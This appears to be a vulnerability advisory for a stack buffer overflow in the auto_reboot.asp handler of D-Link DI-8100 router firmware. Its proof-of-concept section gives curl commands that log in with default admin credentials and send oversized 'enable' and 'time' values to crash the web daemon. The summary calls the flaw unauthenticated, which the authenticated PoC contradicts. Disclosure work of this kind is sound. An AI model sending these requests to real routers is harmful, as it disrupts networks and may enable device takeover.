# D-Link DI-8100 auto_reboot_asp sprintf Buffer Overflow Vulnerability


**Vendor:** D-Link Corporation  
**Product:** DI-8100 Router  
**Affected Version:** 16.07.26A1  
**Vulnerability Type:** Stack-based Buffer Overflow (CWE-120 / CWE-787)


## Summary

A critical stack-based buffer overflow vulnerability exists in the `auto_reboot_asp` function of the D-Link DI-8100 router firmware. The flaw occurs when processing the `/auto_reboot.asp` endpoint due to unsafe use of `sprintf()` with user-controlled `enable` and `time` parameters retrieved from NVRAM. An unauthenticated remote attacker can send a specially crafted HTTP request containing overly long parameter values, causing the HTTP daemon (`jhttpd`) to crash or potentially execute arbitrary code.


## Technical Details

The vulnerable function `auto_reboot_asp` (address `0x0042a180`) handles configuration of the automatic reboot feature. It retrieves the `enable` and `time` HTTP POST parameters, stores them in NVRAM, and later reads them back to construct a JSON response.

The response is formatted using `sprintf()` into a fixed-size stack buffer `acStack_90` (104 bytes) without length validation:

<img width="1811" height="492" alt="image" src="https://github.com/user-attachments/assets/9ceb93c6-19dc-4295-bde3-8cec8745244b" />

<img width="1764" height="560" alt="image" src="https://github.com/user-attachments/assets/698acc07-9520-40e7-8a2f-2899180d83bf" />

Since NVRAM values are derived directly from user input without truncation, an attacker can supply a payload exceeding the available buffer space. This leads to stack memory corruption, overwriting the function's return address and potentially hijacking execution flow.

### Affected Endpoint
- URL: `/auto_reboot.asp`
- Parameters: `enable`, `time`
- Method: POST


## Proof of Concept

```bash
curl -s -c /tmp/cookie.txt -X POST "http://192.168.0.1/login.cgi" \
  -d "user=admin&password=admin"

curl -s -b /tmp/cookie.txt -X POST "http://192.168.0.1/auto_reboot.asp" \
  -d "enable=$(python3 -c 'print("A"*2000)')&time=$(python3 -c 'print("A"*2000)')"
```

### Outcome

<img width="2218" height="676" alt="image" src="https://github.com/user-attachments/assets/bf6b6019-e048-4c56-b4a4-8a14804fb576" />



## Impact

- **Confidentiality:** High – Arbitrary code execution could expose credentials and configuration data.
- **Integrity:** High – Configuration tampering, DNS hijacking, traffic redirection.
- **Availability:** High – Remote denial of service; router requires reboot to recover.

A successful exploit could allow an attacker to take full control of the router, pivot to internal networks, or disrupt connectivity.
